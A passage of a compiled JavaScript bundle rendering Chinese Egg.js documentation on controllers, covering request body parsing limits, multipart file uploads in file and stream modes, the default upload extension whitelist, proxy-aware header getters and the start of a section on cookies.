\u65b9\u6cd5\u4e2d\u6309\u7167\u6b64\u65b9\u6cd5\u83b7\u53d6\u5230\u5185\u5bb9\u3002"),r.a.createElement(o["a"],{code:'// POST /api/posts HTTP/1.1\n// Host: localhost:3000\n// Content-Type: application/json; charset=UTF-8\n//\n// {"title": "controller", "content": "what is controller"}\nclass PostController extends Controller {\n  async listPosts() {\n    assert.equal(this.ctx.request.body.title, \'controller\');\n    assert.equal(this.ctx.request.body.content, \'what is controller\');\n  }\n}',lang:"js"}),r.a.createElement("p",null,"\u6846\u67b6\u5bf9 bodyParser \u8bbe\u7f6e\u4e86\u4e00\u4e9b\u9ed8\u8ba4\u53c2\u6570\uff0c\u914d\u7f6e\u597d\u4e4b\u540e\u62e5\u6709\u4ee5\u4e0b\u7279\u6027\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f53\u8bf7\u6c42\u7684 Content-Type \u4e3a ",r.a.createElement("code",null,"application/json"),"\uff0c",r.a.createElement("code",null,"application/json-patch+json"),"\uff0c",r.a.createElement("code",null,"application/vnd.api+json")," \u548c ",r.a.createElement("code",null,"application/csp-report")," \u65f6\uff0c\u4f1a\u6309\u7167 json \u683c\u5f0f\u5bf9\u8bf7\u6c42 body \u8fdb\u884c\u89e3\u6790\uff0c\u5e76\u9650\u5236 body \u6700\u5927\u957f\u5ea6\u4e3a ",r.a.createElement("code",null,"100kb"),"\u3002"),r.a.createElement("li",null,"\u5f53\u8bf7\u6c42\u7684 Content-Type \u4e3a ",r.a.createElement("code",null,"application/x-www-form-urlencoded")," \u65f6\uff0c\u4f1a\u6309\u7167 form \u683c\u5f0f\u5bf9\u8bf7\u6c42 body \u8fdb\u884c\u89e3\u6790\uff0c\u5e76\u9650\u5236 body \u6700\u5927\u957f\u5ea6\u4e3a ",r.a.createElement("code",null,"100kb"),"\u3002"),r.a.createElement("li",null,"\u5982\u679c\u89e3\u6790\u6210\u529f\uff0cbody \u4e00\u5b9a\u4f1a\u662f\u4e00\u4e2a Object\uff08\u53ef\u80fd\u662f\u4e00\u4e2a\u6570\u7ec4\uff09\u3002")),r.a.createElement("p",null,"\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6700\u7ecf\u5e38\u8c03\u6574\u7684\u914d\u7f6e\u9879\u5c31\u662f\u53d8\u66f4\u89e3\u6790\u65f6\u5141\u8bb8\u7684\u6700\u5927\u957f\u5ea6\uff0c\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"config/config.default.js")," \u4e2d\u8986\u76d6\u6846\u67b6\u7684\u9ed8\u8ba4\u503c\u3002"),r.a.createElement(o["a"],{code:"module.exports = {\n  bodyParser: {\n    jsonLimit: '1mb',\n    formLimit: '1mb',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42 body \u8d85\u8fc7\u4e86\u6211\u4eec\u914d\u7f6e\u7684\u89e3\u6790\u6700\u5927\u957f\u5ea6\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u72b6\u6001\u7801\u4e3a ",r.a.createElement("code",null,"413")," \u7684\u5f02\u5e38\uff0c\u5982\u679c\u7528\u6237\u8bf7\u6c42\u7684 body \u89e3\u6790\u5931\u8d25\uff08\u9519\u8bef\u7684 JSON\uff09\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u72b6\u6001\u7801\u4e3a ",r.a.createElement("code",null,"400")," \u7684\u5f02\u5e38\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5728\u8c03\u6574 bodyParser \u652f\u6301\u7684 body \u957f\u5ea6\u65f6\uff0c\u5982\u679c\u6211\u4eec\u5e94\u7528\u524d\u9762\u8fd8\u6709\u4e00\u5c42\u53cd\u5411\u4ee3\u7406\uff08Nginx\uff09\uff0c\u53ef\u80fd\u4e5f\u9700\u8981\u8c03\u6574\u5b83\u7684\u914d\u7f6e\uff0c\u786e\u4fdd\u53cd\u5411\u4ee3\u7406\u4e5f\u652f\u6301\u540c\u6837\u957f\u5ea6\u7684\u8bf7\u6c42 body\u3002")),r.a.createElement("p",null,r.a.createElement("strong",null,"\u4e00\u4e2a\u5e38\u89c1\u7684\u9519\u8bef\u662f\u628a ",r.a.createElement("code",null,"ctx.request.body")," \u548c ",r.a.createElement("code",null,"ctx.body")," \u6df7\u6dc6\uff0c\u540e\u8005\u5176\u5b9e\u662f ",r.a.createElement("code",null,"ctx.response.body")," \u7684\u7b80\u5199\u3002")),r.a.createElement("h3",{id:"\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6"),r.a.createElement("p",null,"\u8bf7\u6c42 body \u9664\u4e86\u53ef\u4ee5\u5e26\u53c2\u6570\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u53d1\u9001\u6587\u4ef6\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u6d4f\u89c8\u5668\u4e0a\u90fd\u662f\u901a\u8fc7 ",r.a.createElement("code",null,"Multipart/form-data")," \u683c\u5f0f\u53d1\u9001\u6587\u4ef6\u7684\uff0c\u6846\u67b6\u901a\u8fc7\u5185\u7f6e ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-multipart"},"Multipart")," \u63d2\u4ef6\u6765\u652f\u6301\u83b7\u53d6\u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u4e3a\u4f60\u63d0\u4f9b\u4e86\u4e24\u79cd\u65b9\u5f0f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("h4",{id:"file-\u6a21\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#file-\u6a21\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"File \u6a21\u5f0f\uff1a"),"\u5982\u679c\u4f60\u5b8c\u5168\u4e0d\u77e5\u9053 Nodejs \u4e2d\u7684 Stream \u7528\u6cd5\uff0c\u90a3\u4e48 File \u6a21\u5f0f\u975e\u5e38\u5408\u9002\u4f60\uff1a")),r.a.createElement("p",null,"1\uff09\u5728 config \u6587\u4ef6\u4e2d\u542f\u7528 ",r.a.createElement("code",null,"file")," \u6a21\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.multipart = {\n  mode: 'file',\n};",lang:"js"}),r.a.createElement("p",null,"2\uff09\u4e0a\u4f20 / \u63a5\u6536\u6587\u4ef6\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u4e0a\u4f20 / \u63a5\u6536\u5355\u4e2a\u6587\u4ef6\uff1a")),r.a.createElement("p",null,"\u4f60\u7684\u524d\u7aef\u9759\u6001\u9875\u9762\u4ee3\u7801\u5e94\u8be5\u770b\u4e0a\u53bb\u5982\u4e0b\u6837\u5b50\uff1a"),r.a.createElement(o["a"],{code:'<form\n  method="POST"\n  action="/upload?_csrf={{ ctx.csrf | safe }}"\n  enctype="multipart/form-data"\n>\n  title: <input name="title" /> file: <input name="file" type="file" />\n  <button type="submit">Upload</button>\n</form>',lang:"html"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u540e\u7aef\u4ee3\u7801\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/upload.js\nconst Controller = require('egg').Controller;\nconst fs = require('fs/promises');\n\nmodule.exports = class extends Controller {\n  async upload() {\n    const { ctx } = this;\n    const file = ctx.request.files[0];\n    const name = 'egg-multipart-test/' + path.basename(file.filename);\n    let result;\n    try {\n      // \u5904\u7406\u6587\u4ef6\uff0c\u6bd4\u5982\u4e0a\u4f20\u5230\u4e91\u7aef\n      result = await ctx.oss.put(name, file.filepath);\n    } finally {\n      // \u9700\u8981\u5220\u9664\u4e34\u65f6\u6587\u4ef6\n      await fs.unlink(file.filepath);\n    }\n\n    ctx.body = {\n      url: result.url,\n      // \u83b7\u53d6\u6240\u6709\u7684\u5b57\u6bb5\u503c\n      requestBody: ctx.request.body,\n    };\n  }\n};",lang:"js"}),r.a.createElement("ol",{start:2},r.a.createElement("li",null,"\u4e0a\u4f20 / \u63a5\u6536\u591a\u4e2a\u6587\u4ef6\uff1a")),r.a.createElement("p",null,"\u5bf9\u4e8e\u591a\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u501f\u52a9 ",r.a.createElement("code",null,"ctx.request.files")," \u5c5e\u6027\u8fdb\u884c\u904d\u5386\uff0c\u7136\u540e\u5206\u522b\u8fdb\u884c\u5904\u7406\uff1a"),r.a.createElement("p",null,"\u4f60\u7684\u524d\u7aef\u9759\u6001\u9875\u9762\u4ee3\u7801\u5e94\u8be5\u770b\u4e0a\u53bb\u5982\u4e0b\u6837\u5b50\uff1a"),r.a.createElement(o["a"],{code:'<form\n  method="POST"\n  action="/upload?_csrf={{ ctx.csrf | safe }}"\n  enctype="multipart/form-data"\n>\n  title: <input name="title" /> file1: <input name="file1" type="file" /> file2:\n  <input name="file2" type="file" />\n  <button type="submit">Upload</button>\n</form>',lang:"html"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u540e\u7aef\u4ee3\u7801\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/upload.js\nconst Controller = require('egg').Controller;\nconst fs = require('fs/promises');\n\nmodule.exports = class extends Controller {\n  async upload() {\n    const { ctx } = this;\n    console.log(ctx.request.body);\n    console.log('got %d files', ctx.request.files.length);\n    for (const file of ctx.request.files) {\n      console.log('field: ' + file.fieldname);\n      console.log('filename: ' + file.filename);\n      console.log('encoding: ' + file.encoding);\n      console.log('mime: ' + file.mime);\n      console.log('tmp filepath: ' + file.filepath);\n      let result;\n      try {\n        // \u5904\u7406\u6587\u4ef6\uff0c\u6bd4\u5982\u4e0a\u4f20\u5230\u4e91\u7aef\n        result = await ctx.oss.put(\n          'egg-multipart-test/' + file.filename,\n          file.filepath,\n        );\n      } finally {\n        // \u9700\u8981\u5220\u9664\u4e34\u65f6\u6587\u4ef6\n        await fs.unlink(file.filepath);\n      }\n      console.log(result);\n    }\n  }\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("h4",{id:"stream-\u6a21\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#stream-\u6a21\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Stream \u6a21\u5f0f\uff1a"),"\u5982\u679c\u4f60\u5bf9\u4e8e Node \u4e2d\u7684 Stream \u6a21\u5f0f\u975e\u5e38\u719f\u6089\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u9009\u62e9\u6b64\u6a21\u5f0f\u3002\u5728 Controller \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.getFileStream()")," \u63a5\u53e3\u80fd\u83b7\u53d6\u5230\u4e0a\u4f20\u7684\u6587\u4ef6\u6d41\u3002")),r.a.createElement("ol",null,r.a.createElement("li",null,"\u4e0a\u4f20 / \u63a5\u53d7\u5355\u4e2a\u6587\u4ef6\uff1a")),r.a.createElement(o["a"],{code:'<form\n  method="POST"\n  action="/upload?_csrf={{ ctx.csrf | safe }}"\n  enctype="multipart/form-data"\n>\n  title: <input name="title" /> file: <input name="file" type="file" />\n  <button type="submit">Upload</button>\n</form>',lang:"html"}),r.a.createElement(o["a"],{code:"const path = require('path');\nconst sendToWormhole = require('stream-wormhole');\nconst Controller = require('egg').Controller;\n\nclass UploaderController extends Controller {\n  async upload() {\n    const ctx = this.ctx;\n    const stream = await ctx.getFileStream();\n    const name = 'egg-multipart-test/' + path.basename(stream.filename);\n    // \u6587\u4ef6\u5904\u7406\uff0c\u4e0a\u4f20\u5230\u4e91\u5b58\u50a8\u7b49\u7b49\n    let result;\n    try {\n      result = await ctx.oss.put(name, stream);\n    } catch (err) {\n      // \u5fc5\u987b\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u6d41\u6d88\u8d39\u6389\uff0c\u8981\u4e0d\u7136\u6d4f\u89c8\u5668\u54cd\u5e94\u4f1a\u5361\u6b7b\n      await sendToWormhole(stream);\n      throw err;\n    }\n\n    ctx.body = {\n      url: result.url,\n      // \u6240\u6709\u8868\u5355\u5b57\u6bb5\u90fd\u80fd\u901a\u8fc7 `stream.fields` \u83b7\u53d6\u5230\n      fields: stream.fields,\n    };\n  }\n}\n\nmodule.exports = UploaderController;",lang:"js"}),r.a.createElement("p",null,"\u8981\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.getFileStream")," \u4fbf\u6377\u7684\u83b7\u53d6\u5230\u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u9700\u8981\u6ee1\u8db3\u4e24\u4e2a\u6761\u4ef6\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u53ea\u652f\u6301\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u3002"),r.a.createElement("li",null,"\u4e0a\u4f20\u6587\u4ef6\u5fc5\u987b\u5728\u6240\u6709\u5176\u4ed6\u7684 fields \u540e\u9762\uff0c\u5426\u5219\u5728\u62ff\u5230\u6587\u4ef6\u6d41\u65f6\u53ef\u80fd\u8fd8\u83b7\u53d6\u4e0d\u5230 fields\u3002")),r.a.createElement("ol",{start:2},r.a.createElement("li",null,"\u4e0a\u4f20 / \u63a5\u53d7\u591a\u4e2a\u6587\u4ef6\uff1a")),r.a.createElement("p",null,"\u5982\u679c\u8981\u83b7\u53d6\u540c\u65f6\u4e0a\u4f20\u7684\u591a\u4e2a\u6587\u4ef6\uff0c\u4e0d\u80fd\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.getFileStream()")," \u6765\u83b7\u53d6\uff0c\u53ea\u80fd\u901a\u8fc7\u4e0b\u9762\u8fd9\u79cd\u65b9\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"const sendToWormhole = require('stream-wormhole');\nconst Controller = require('egg').Controller;\n\nclass UploaderController extends Controller {\n  async upload() {\n    const ctx = this.ctx;\n    const parts = ctx.multipart();\n    let part;\n    // parts() \u8fd4\u56de promise \u5bf9\u8c61\n    while ((part = await parts()) != null) {\n      if (part.length) {\n        // \u8fd9\u662f busboy \u7684\u5b57\u6bb5\n        console.log('field: ' + part[0]);\n        console.log('value: ' + part[1]);\n        console.log('valueTruncated: ' + part[2]);\n        console.log('fieldnameTruncated: ' + part[3]);\n      } else {\n        if (!part.filename) {\n          // \u8fd9\u65f6\u662f\u7528\u6237\u6ca1\u6709\u9009\u62e9\u6587\u4ef6\u5c31\u70b9\u51fb\u4e86\u4e0a\u4f20(part \u662f file stream\uff0c\u4f46\u662f part.filename \u4e3a\u7a7a)\n          // \u9700\u8981\u505a\u51fa\u5904\u7406\uff0c\u4f8b\u5982\u7ed9\u51fa\u9519\u8bef\u63d0\u793a\u6d88\u606f\n          return;\n        }\n        // part \u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u6d41\n        console.log('field: ' + part.fieldname);\n        console.log('filename: ' + part.filename);\n        console.log('encoding: ' + part.encoding);\n        console.log('mime: ' + part.mime);\n        // \u6587\u4ef6\u5904\u7406\uff0c\u4e0a\u4f20\u5230\u4e91\u5b58\u50a8\u7b49\u7b49\n        let result;\n        try {\n          result = await ctx.oss.put(\n            'egg-multipart-test/' + part.filename,\n            part,\n          );\n        } catch (err) {\n          // \u5fc5\u987b\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u6d41\u6d88\u8d39\u6389\uff0c\u8981\u4e0d\u7136\u6d4f\u89c8\u5668\u54cd\u5e94\u4f1a\u5361\u6b7b\n          await sendToWormhole(part);\n          throw err;\n        }\n        console.log(result);\n      }\n    }\n    console.log('and we are done parsing the form!');\n  }\n}\n\nmodule.exports = UploaderController;",lang:"js"}),r.a.createElement("p",null,"\u4e3a\u4e86\u4fdd\u8bc1\u6587\u4ef6\u4e0a\u4f20\u7684\u5b89\u5168\uff0c\u6846\u67b6\u9650\u5236\u4e86\u652f\u6301\u7684\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u6846\u67b6\u9ed8\u8ba4\u652f\u6301\u767d\u540d\u5355\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"// images\n'.jpg', '.jpeg', // image/jpeg\n'.png', // image/png, image/x-png\n'.gif', // image/gif\n'.bmp', // image/bmp\n'.wbmp', // image/vnd.wap.wbmp\n'.webp',\n'.tif',\n'.psd',\n// text\n'.svg',\n'.js', '.jsx',\n'.json',\n'.css', '.less',\n'.html', '.htm',\n'.xml',\n// tar\n'.zip',\n'.gz', '.tgz', '.gzip',\n// video\n'.mp3',\n'.mp4',\n'.avi',",lang:"js"}),r.a.createElement("p",null,"\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5728 ",r.a.createElement("code",null,"config/config.default.js")," \u4e2d\u914d\u7f6e\u6765\u65b0\u589e\u652f\u6301\u7684\u6587\u4ef6\u6269\u5c55\u540d\uff0c\u6216\u8005\u91cd\u5199\u6574\u4e2a\u767d\u540d\u5355"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u65b0\u589e\u652f\u6301\u7684\u6587\u4ef6\u6269\u5c55\u540d")),r.a.createElement(o["a"],{code:"module.exports = {\n  multipart: {\n    fileExtensions: ['.apk'], // \u589e\u52a0\u5bf9 apk \u6269\u5c55\u540d\u7684\u6587\u4ef6\u652f\u6301\n  },\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u8986\u76d6\u6574\u4e2a\u767d\u540d\u5355")),r.a.createElement(o["a"],{code:"module.exports = {\n  multipart: {\n    whitelist: ['.png'], // \u8986\u76d6\u6574\u4e2a\u767d\u540d\u5355\uff0c\u53ea\u5141\u8bb8\u4e0a\u4f20 '.png' \u683c\u5f0f\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5f53\u91cd\u5199\u4e86 whitelist \u65f6\uff0cfileExtensions \u4e0d\u751f\u6548\u3002")),r.a.createElement("p",null,"\u6b32\u4e86\u89e3\u66f4\u591a\u76f8\u5173\u6b64\u6280\u672f\u7ec6\u8282\u548c\u8be6\u60c5\uff0c\u8bf7\u53c2\u9605 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-multipart"},"Egg-Multipart"),"\u3002"),r.a.createElement("h3",{id:"header"},r.a.createElement(l["AnchorLink"],{to:"#header","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"header"),r.a.createElement("p",null,"\u9664\u4e86\u4ece URL \u548c\u8bf7\u6c42 body \u4e0a\u83b7\u53d6\u53c2\u6570\u4e4b\u5916\uff0c\u8fd8\u6709\u8bb8\u591a\u53c2\u6570\u662f\u901a\u8fc7\u8bf7\u6c42 header \u4f20\u9012\u7684\u3002\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u4e9b\u8f85\u52a9\u5c5e\u6027\u548c\u65b9\u6cd5\u6765\u83b7\u53d6\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.headers"),"\uff0c",r.a.createElement("code",null,"ctx.header"),"\uff0c",r.a.createElement("code",null,"ctx.request.headers"),"\uff0c",r.a.createElement("code",null,"ctx.request.header"),"\uff1a\u8fd9\u51e0\u4e2a\u65b9\u6cd5\u662f\u7b49\u4ef7\u7684\uff0c\u90fd\u662f\u83b7\u53d6\u6574\u4e2a header \u5bf9\u8c61\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.get(name)"),"\uff0c",r.a.createElement("code",null,"ctx.request.get(name)"),"\uff1a\u83b7\u53d6\u8bf7\u6c42 header \u4e2d\u7684\u4e00\u4e2a\u5b57\u6bb5\u7684\u503c\uff0c\u5982\u679c\u8fd9\u4e2a\u5b57\u6bb5\u4e0d\u5b58\u5728\uff0c\u4f1a\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002"),r.a.createElement("li",null,"\u6211\u4eec\u5efa\u8bae\u7528 ",r.a.createElement("code",null,"ctx.get(name)")," \u800c\u4e0d\u662f ",r.a.createElement("code",null,"ctx.headers['name']"),"\uff0c\u56e0\u4e3a\u524d\u8005\u4f1a\u81ea\u52a8\u5904\u7406\u5927\u5c0f\u5199\u3002")),r.a.createElement("p",null,"\u7531\u4e8e header \u6bd4\u8f83\u7279\u6b8a\uff0c\u6709\u4e00\u4e9b\u662f ",r.a.createElement("code",null,"HTTP")," \u534f\u8bae\u89c4\u5b9a\u4e86\u5177\u4f53\u542b\u4e49\u7684\uff08\u4f8b\u5982 ",r.a.createElement("code",null,"Content-Type"),"\uff0c",r.a.createElement("code",null,"Accept"),"\uff09\uff0c\u6709\u4e9b\u662f\u53cd\u5411\u4ee3\u7406\u8bbe\u7f6e\u7684\uff0c\u5df2\u7ecf\u7ea6\u5b9a\u4fd7\u6210\uff08X-Forwarded-For\uff09\uff0c\u6846\u67b6\u4e5f\u4f1a\u5bf9\u4ed6\u4eec\u589e\u52a0\u4e00\u4e9b\u4fbf\u6377\u7684 getter\uff0c\u8be6\u7ec6\u7684 getter \u53ef\u4ee5\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://eggjs.org/api/"},"API")," \u6587\u6863\u3002"),r.a.createElement("p",null,"\u7279\u522b\u662f\u5982\u679c\u6211\u4eec\u901a\u8fc7 ",r.a.createElement("code",null,"config.proxy = true")," \u8bbe\u7f6e\u4e86\u5e94\u7528\u90e8\u7f72\u5728\u53cd\u5411\u4ee3\u7406\uff08Nginx\uff09\u4e4b\u540e\uff0c\u6709\u4e00\u4e9b Getter \u7684\u5185\u90e8\u5904\u7406\u4f1a\u53d1\u751f\u6539\u53d8\u3002"),r.a.createElement("h4",{id:"ctxhost"},r.a.createElement(l["AnchorLink"],{to:"#ctxhost","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.host")),r.a.createElement("p",null,"\u4f18\u5148\u8bfb\u901a\u8fc7 ",r.a.createElement("code",null,"config.hostHeaders")," \u4e2d\u914d\u7f6e\u7684 header \u7684\u503c\uff0c\u8bfb\u4e0d\u5230\u65f6\u518d\u5c1d\u8bd5\u83b7\u53d6 host \u8fd9\u4e2a header \u7684\u503c\uff0c\u5982\u679c\u90fd\u83b7\u53d6\u4e0d\u5230\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002"),r.a.createElement("p",null,r.a.createElement("code",null,"config.hostHeaders")," \u9ed8\u8ba4\u914d\u7f6e\u4e3a ",r.a.createElement("code",null,"x-forwarded-host"),"\u3002"),r.a.createElement("h4",{id:"ctxprotocol"},r.a.createElement(l["AnchorLink"],{to:"#ctxprotocol","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.protocol")),r.a.createElement("p",null,"\u901a\u8fc7\u8fd9\u4e2a Getter \u83b7\u53d6 protocol \u65f6\uff0c\u9996\u5148\u4f1a\u5224\u65ad\u5f53\u524d\u8fde\u63a5\u662f\u5426\u662f\u52a0\u5bc6\u8fde\u63a5\uff0c\u5982\u679c\u662f\u52a0\u5bc6\u8fde\u63a5\uff0c\u8fd4\u56de https\u3002"),r.a.createElement("p",null,"\u5982\u679c\u5904\u4e8e\u975e\u52a0\u5bc6\u8fde\u63a5\u65f6\uff0c\u4f18\u5148\u8bfb\u901a\u8fc7 ",r.a.createElement("code",null,"config.protocolHeaders")," \u4e2d\u914d\u7f6e\u7684 header \u7684\u503c\u6765\u5224\u65ad\u662f HTTP \u8fd8\u662f https\uff0c\u5982\u679c\u8bfb\u53d6\u4e0d\u5230\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u914d\u7f6e\u4e2d\u901a\u8fc7 ",r.a.createElement("code",null,"config.protocol")," \u6765\u8bbe\u7f6e\u515c\u5e95\u503c\uff0c\u9ed8\u8ba4\u4e3a HTTP\u3002"),r.a.createElement("p",null,r.a.createElement("code",null,"config.protocolHeaders")," \u9ed8\u8ba4\u914d\u7f6e\u4e3a ",r.a.createElement("code",null,"x-forwarded-proto"),"\u3002"),r.a.createElement("h4",{id:"ctxips"},r.a.createElement(l["AnchorLink"],{to:"#ctxips","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.ips")),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.ips")," \u83b7\u53d6\u8bf7\u6c42\u7ecf\u8fc7\u6240\u6709\u7684\u4e2d\u95f4\u8bbe\u5907 IP \u5730\u5740\u5217\u8868\uff0c\u53ea\u6709\u5728 ",r.a.createElement("code",null,"config.proxy = true")," \u65f6\uff0c\u624d\u4f1a\u901a\u8fc7\u8bfb\u53d6 ",r.a.createElement("code",null,"config.ipHeaders")," \u4e2d\u914d\u7f6e\u7684 header \u7684\u503c\u6765\u83b7\u53d6\uff0c\u83b7\u53d6\u4e0d\u5230\u65f6\u4e3a\u7a7a\u6570\u7ec4\u3002"),r.a.createElement("p",null,r.a.createElement("code",null,"config.ipHeaders")," \u9ed8\u8ba4\u914d\u7f6e\u4e3a ",r.a.createElement("code",null,"x-forwarded-for"),"\u3002"),r.a.createElement("h4",{id:"ctxip"},r.a.createElement(l["AnchorLink"],{to:"#ctxip","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.ip")),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.ip")," \u83b7\u53d6\u8bf7\u6c42\u53d1\u8d77\u65b9\u7684 IP \u5730\u5740\uff0c\u4f18\u5148\u4ece ",r.a.createElement("code",null,"ctx.ips")," \u4e2d\u83b7\u53d6\uff0c",r.a.createElement("code",null,"ctx.ips")," \u4e3a\u7a7a\u65f6\u4f7f\u7528\u8fde\u63a5\u4e0a\u53d1\u8d77\u65b9\u7684 IP \u5730\u5740\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a",r.a.createElement("code",null,"ip")," \u548c ",r.a.createElement("code",null,"ips")," \u4e0d\u540c\uff0c",r.a.createElement("code",null,"ip")," \u5f53 ",r.a.createElement("code",null,"config.proxy = false")," \u65f6\u4f1a\u8fd4\u56de\u5f53\u524d\u8fde\u63a5\u53d1\u8d77\u8005\u7684 ",r.a.createElement("code",null,"ip")," \u5730\u5740\uff0c",r.a.createElement("code",null,"ips")," \u6b64\u65f6\u4f1a\u4e3a\u7a7a\u6570\u7ec4\u3002")),r.a.createElement("h3",{id:"cookie"},r.a.createElement(l["AnchorLink"],{to:"#cookie","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Cookie"),r.a.createElement("p",null,"HTTP \u8bf7\u6c42\u90fd\u662f\u65e0\u72b6\u6001\u7684\uff0c\u4f46\u662f\u6211\u4eec\u7684 Web \u5e94\u7528\u901a\u5e38\u90fd\u9700\u8981\u77e5\u9053\u53d1\u8d77\u8bf7\u6c42\u7684\u4eba\u662f\u8c01\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cHTTP \u534f\u8bae\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u7279\u6b8a\u7684\u8bf7\u6c42\u5934\uff1a",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/HTTP_cookie"},"Cookie"),"\u3002\u670d\u52a1\u7aef\u53ef\u4ee5\u901a\u8fc7\u54cd\u5e94\u5934\uff08set-cookie\uff09\u5c06\u5c11\u91cf\u6570\u636e\u54cd\u5e94\u7ed9\u5ba2\u6237\u7aef\uff0c\u6d4f\u89c8\u5668\u4f1a\u9075\u5faa\u534f\u8bae\u5c06\u6570\u636e\u4fdd\u5b58\uff0c\u5e76\u5728\u4e0b\u6b21\u8bf7\u6c42\u540c\u4e00\u4e2a\u670d\u52a1\u7684\u65f6\u5019\u5e26\u4e0a\uff08\u6d4f\u89c8\u5668\u4e5f\u4f1a\u9075\u5faa\u534f\u8bae\uff0c\u53ea\u5728\u8bbf\u95ee\u7b26\u5408 Cookie \u6307\u5b9a\u89c4\u5219\u7684\u7f51\u7ad9\u65f6\u5e26\u4e0a\u5bf9\u5e94\u7684 Cookie \u6765\u4fdd\u8bc1\u5b89\u5168\u6027\uff09\u3002"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.cookies"),"\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 Controller \u4e2d\u4fbf\u6377\u3001\u5b89\u5168\u7684\u8bbe\u7f6e\u548c\u8bfb\u53d6 Cookie\u3002"),r.a.createElement(o["a"],{code:"class CookieController extends Controller {\n  async add() {\n    const ctx = this.ctx;\n    let count = ctx.cookies.get('count');\n    count = count ? Number(count) : 0;\n    ctx.cookies.set('count', ++count);\n    ctx.body = count;\n  }\n\n  async remove() {\n    const ctx = this.ctx;\n    const count = ctx.cookies.set('count', null);\n    ctx.status = 204;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Cookie \u867d\u7136\u5728 HTTP \u4e2d\u53ea\u662f\u4e00\u4e2a\u5934\uff0c\u4f46\u662f\u901a\u8fc7 ",r.a.createElement("code",null,"foo=bar;foo1=bar1;")," \u7684\u683c\u5f0f\u53ef\u4ee5\u8bbe\u7f6e\u591a\u4e2a\u952e\u503c\u5bf9\u3002"),r.a.createElement("p",null,"Cookie \u5728 Web 